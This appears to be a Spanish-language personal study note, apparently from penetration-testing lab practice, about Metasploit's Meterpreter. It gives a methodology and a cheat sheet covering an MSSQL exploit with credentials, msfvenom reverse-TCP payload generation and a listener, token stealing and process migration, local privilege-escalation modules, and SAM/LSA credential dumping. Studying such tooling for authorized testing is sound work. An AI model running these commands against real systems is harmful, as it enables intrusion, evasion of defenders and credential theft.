---
tags:
  - metasploit/meterpreter
---
## Conceptos Clave (TL;DR)

* Payload extensible y multifacético que utiliza inyección DLL para establecer una conexión estable y difícil de detectar.
* Reside completamente en la memoria del host remoto sin escribir en el disco duro, evadiendo técnicas forenses convencionales.
* Establece una comunicación encriptada mediante AES a través de un sistema de canales entre el objetivo y el atacante.
* Permite cargar extensiones en tiempo de ejecución de manera modular y sin necesidad de recompilar el código.
* Herramienta fundamental para enumeración interna, escalada de privilegios, evasión de antivirus, persistencia y pivoting.
  

## Herramientas Clave

* **msfconsole**: Interfaz principal para manejar exploits, payloads y módulos de post-explotación.
* **db_nmap**: Integración de Nmap dentro de MSF que permite registrar automáticamente los resultados del escaneo en la base de datos interna.
* **Meterpreter**: Shell avanzado y dinámico en memoria que expande las capacidades del atacante una vez comprometido el host.
* **local_exploit_suggester**: Módulo de reconocimiento (post-explotación) que evalúa un host comprometido para sugerir vulnerabilidades locales viables para escalada de privilegios.

  
## Metodología Paso a Paso

1. **Escaneo y Enumeración**: Utilizar herramientas integradas en [Metasploit](../../📂%2008%20Herramientas&Cheatsheets/Metasploit.md) para descubrir servicios activos y determinar las versiones (ej. Microsoft IIS 6.0).
2. **Explotación Inicial**: Buscar módulos específicos para las vulnerabilidades encontradas, configurar los parámetros obligatorios (RHOSTS, LHOST) y lanzar el ataque para obtener una sesión inicial.
3. **Estabilización y Migración**: Si los permisos de la sesión inicial son limitados o inestables, listar los procesos del sistema y robar el token o migrar hacia un proceso con mayores privilegios (como NT AUTHORITY\NETWORK SERVICE).
4. **Escalada de Privilegios**: Enviar la sesión actual a segundo plano y ejecutar módulos de reconocimiento local para identificar fallos a nivel de sistema operativo. Ejecutar el exploit local sugerido para ganar acceso de nivel `SYSTEM`.
5. **Extracción de Credenciales (Looting)**: Una vez asegurado el acceso administrativo, extraer hashes de contraseñas locales (SAM) y secretos LSA para facilitar el movimiento lateral y el pivoting en la red.

  
## Cheat Sheet de Comandos
```bash
#SQL Meterpreter
# Primero verifica qué puertos están realmente abiertos
nmap -p 88,135,139,445,1433 10.129.43.43

# Si el puerto 88 NO está abierto, usa autenticación NTLM directa:
msf6 > use exploit/windows/mssql/mssql_payload

msf6 exploit(windows/mssql/mssql_payload) > set RHOSTS 10.129.43.43
msf6 exploit(windows/mssql/mssql_payload) > set RPORT 1433
msf6 exploit(windows/mssql/mssql_payload) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/mssql/mssql_payload) > set LHOST <tu_ip_kali>
msf6 exploit(windows/mssql/mssql_payload) > set LPORT 4444

# Configura para usar autenticación SQL tradicional (NO Kerberos)
msf6 exploit(windows/mssql/mssql_payload) > set USERNAME sql_dev
msf6 exploit(windows/mssql/mssql_payload) > set PASSWORD 'Str0ng_P@ssw0rd!'

msf6 exploit(windows/mssql/mssql_payload) > exploit
```

```sh
# Creando una sesión
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<TU_IP_VPN> LPORT=4444 -f elf -o shell.elf

# Paso 2: Configurar el Listener en Metasploit
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp

set LHOST <TU_IP_VPN>
set LPORT 4444

run

#Paso 3: Transferir el Payload a la Máquina Objetivo
scp shell.elf usuario_objetivo@ip_objetivo:/tmp/shell.elf

# Dale permisos de ejecución al archivo que acabas de subir:
chmod +x /tmp/shell.elf

# Ejecuta el archivo:
/tmp/shell.elf
```

```bash
# Escaneo de puertos integrado en la base de datos de Metasploit (escaneo agresivo y de versiones)

db_nmap -sV -p- -T5 -A <TARGET_IP>
```

```bash
# Buscar exploits relacionados con un servicio o tecnología en msfconsole

search <SERVICE_NAME_OR_VULN>
```

```bash
# Configuración rápida de parámetros de explotación

use <EXPLOIT_PATH_OR_ID>

set RHOSTS <TARGET_IP>

set LHOST <ATTACKER_IP>

set LPORT <ATTACKER_PORT>

run
```

```bash
# INTERACCIÓN BÁSICA CON METERPRETER

# Mostrar menú de ayuda con las capacidades de la sesión
?

# o
help

  
# Obtener información del usuario actual bajo el que corre el proceso
getuid

  
# Listar procesos en ejecución en el sistema objetivo
ps

  
# Enviar la sesión activa a segundo plano para operar en msfconsole
bg

# o
background
```

```bash
# MIGRACIÓN Y TOKENS (Dentro de Meterpreter)

# Robar el token de acceso de otro proceso en ejecución usando su PID
steal_token <PID>


# Migrar el servidor Meterpreter a un proceso distinto (útil para estabilidad o privilegios)
migrate <PID>
```

```bash
# SUGERENCIA Y EXPLOTACIÓN LOCAL (Privilege Escalation)

# Volver a msfconsole y cargar el suggester
use post/multi/recon/local_exploit_suggester

  
# Vincular el módulo a la sesión de Meterpreter activa
set SESSION <SESSION_ID>
run

  
# Usar el exploit sugerido y ejecutarlo en la misma sesión
use <SUGGESTED_EXPLOIT_PATH>
set SESSION <SESSION_ID>
set LHOST <ATTACKER_IP>
run
```

```bash
# EXTRACCIÓN DE CREDENCIALES (Requiere privilegios elevados - SYSTEM)

# Volcar la base de datos de hashes SAM
hashdump
 

# Alternativa avanzada: Volcado de hashes usando el módulo LSA
lsa_dump_sam
 

# Volcar secretos LSA (puede contener contraseñas en texto claro o llaves DPAPI)
lsa_dump_secrets
```

## "Gotchas" y Troubleshooting

* **Artefactos Residuales**: Algunos exploits de acceso inicial (como los de WebDAV) suben archivos temporales (ej. `.txt` y `.asp`) al disco físico del objetivo. Si el payload falla en borrarlos por falta de permisos, dejarás IOCs críticos que las defensas pueden detectar mediante firmas o regex.

* **Access Denied en Comandos Básicos**: Si comandos como `getuid` te devuelven `Access is denied`, tu proceso actual no tiene permisos suficientes. Revisa los procesos en ejecución (`ps`) y realiza un `steal_token <PID>` o `migrate` hacia un proceso de red o de sistema que te permita seguir operando.

* **Manipulación de Sesiones**: Todo módulo de post-explotación requiere asignarse a una sesión existente. Debes mandar el Meterpreter a segundo plano explícitamente (`bg` e introducir 'y') para regresar a `msfconsole` y definir la variable `SESSION <ID>` del módulo a utilizar.

* **Visibilidad de Procesos**: Meterpreter no crea nuevos procesos, sino que se inyecta en procesos comprometidos ya existentes. Comprender a qué proceso estás adherido es vital para la estabilidad del payload si el usuario legítimo cierra el programa host.